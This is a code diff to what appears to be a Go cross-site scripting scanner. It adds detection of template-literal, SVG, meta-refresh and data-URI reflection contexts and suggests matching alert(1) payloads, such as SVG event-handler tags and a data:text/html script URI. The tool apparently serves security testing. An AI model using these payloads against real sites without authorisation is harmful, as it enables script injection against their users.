@@ -25,6 +25,22 @@ func DetectContext(body, probe string) models.ReflectionContext {
 		return models.ContextComment
 	}
 
+	if isInMetaRefresh(context, probe) {
+		return models.ContextMetaRefresh
+	}
+
+	if isInDataURI(context, probe) {
+		return models.ContextDataURI
+	}
+
+	if isInSVG(context, probe) {
+		return models.ContextSVG
+	}
+
+	if isInTemplateLiteral(context, probe) {
+		return models.ContextTemplateLiteral
+	}
+
 	if isInJavaScript(context, probe) {
 		return models.ContextJavaScript
 	}
@@ -88,6 +104,44 @@ func isInComment(context, probe string) bool {
 	return commentPattern.MatchString(context)
 }
 
+// isInTemplateLiteral checks if probe is inside JavaScript template literal
+func isInTemplateLiteral(context, probe string) bool {
+	// Check for template literal syntax: `...${probe}...`
+	templateLiteralPattern := regexp.MustCompile("`[^`]*\\$\\{[^}]*" + regexp.QuoteMeta(probe) + "[^}]*\\}[^`]*`")
+	if templateLiteralPattern.MatchString(context) {
+		return true
+	}
+	// Also check for simple backtick strings
+	backtickPattern := regexp.MustCompile("`[^`]*" + regexp.QuoteMeta(probe) + "[^`]*`")
+	return backtickPattern.MatchString(context)
+}
+
+// isInSVG checks if probe is inside SVG context
+func isInSVG(context, probe string) bool {
+	// Check if inside <svg> tags
+	svgPattern := regexp.MustCompile(`(?i)<svg[^>]*>[\s\S]*?` + regexp.QuoteMeta(probe) + `[\s\S]*?</svg>`)
+	if svgPattern.MatchString(context) {
+		return true
+	}
+	// Check for SVG-specific tags
+	svgTagsPattern := regexp.MustCompile(`(?i)<(animate|animateTransform|set|animateMotion|path|circle|rect|line|ellipse|polygon|polyline|text|tspan|image)[^>]*` + regexp.QuoteMeta(probe))
+	return svgTagsPattern.MatchString(context)
+}
+
+// isInMetaRefresh checks if probe is inside meta refresh tag
+func isInMetaRefresh(context, probe string) bool {
+	// Check for meta refresh with URL
+	metaRefreshPattern := regexp.MustCompile(`(?i)<meta[^>]*http-equiv=["']?refresh["']?[^>]*content=["'][^"']*` + regexp.QuoteMeta(probe))
+	return metaRefreshPattern.MatchString(context)
+}
+
+// isInDataURI checks if probe is inside a data URI
+func isInDataURI(context, probe string) bool {
+	// Check for data: URI scheme
+	dataURIPattern := regexp.MustCompile(`(?i)(href|src|action|data|formaction)\s*=\s*["']?data:[^"'\s>]*` + regexp.QuoteMeta(probe))
+	return dataURIPattern.MatchString(context)
+}
+
 // GetSuggestedPayload returns a context-specific XSS payload
 func GetSuggestedPayload(context models.ReflectionContext, unfiltered []string) string {
 	// Check which characters are available
@@ -145,6 +199,38 @@ func GetSuggestedPayload(context models.ReflectionContext, unfiltered []string) 
 
 	case models.ContextURL:
 		return "javascript:alert(1)"
+
+	case models.ContextTemplateLiteral:
+		// Break out of template literal
+		if contains(unfiltered, "$") && contains(unfiltered, "{") && contains(unfiltered, "}") {
+			return "${alert(1)}"
+		}
+		if contains(unfiltered, "`") {
+			return "`+alert(1)+`"
+		}
+		return "';alert(1);//"
+
+	case models.ContextSVG:
+		// SVG-specific XSS
+		if hasLt && hasGt {
+			return "<set attributeName=onmouseover value=alert(1)>"
+		}
+		if hasQuote && hasSpace {
+			quote := "'"
+			if hasDquote {
+				quote = "\""
+			}
+			return quote + " onload=" + quote + "alert(1)"
+		}
+		return "<animate onbegin=alert(1)>"
+
+	case models.ContextMetaRefresh:
+		// Meta refresh URL injection
+		return "javascript:alert(1)"
+
+	case models.ContextDataURI:
+		// Data URI XSS
+		return "data:text/html,<script>alert(1)</script>"
 
 	case models.ContextComment:
 		if hasGt && hasLt {
